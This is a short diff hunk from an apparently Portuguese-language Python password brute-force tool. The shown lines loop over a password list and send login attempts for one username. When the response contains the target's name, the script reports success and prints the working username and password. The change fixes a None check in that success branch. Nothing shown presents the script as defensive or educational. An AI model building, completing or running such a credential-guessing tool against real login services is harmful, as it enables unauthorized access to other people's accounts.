@@ -34,7 +34,7 @@ for i in lista:
     response = enviar(login,i)
     if re.search(nome_do_alvo.upper(), response):
         nome = obter_nome(response)
-        if len(nome) != None:
+        if nome != None:
             ok = (f'\n{Fore.GREEN}Sucesso!\n[200]{Fore.RESET} - Logado como {Fore.GREEN}{nome}{Fore.RESET}.\n\nUsuário: {Fore.GREEN}{login}{Fore.RESET}\nSenha: {Fore.GREEN}{i}{Fore.RESET}')
         else:
             ok = (f'\n{Fore.GREEN}Sucesso!\n[200]{Fore.RESET} - Logado como {Fore.GREEN}{nome_do_alvo.upper()}{Fore.RESET}.\n\nUsuário: {Fore.GREEN}{login}{Fore.RESET}\nSenha: {Fore.GREEN}{i}{Fore.RESET}')
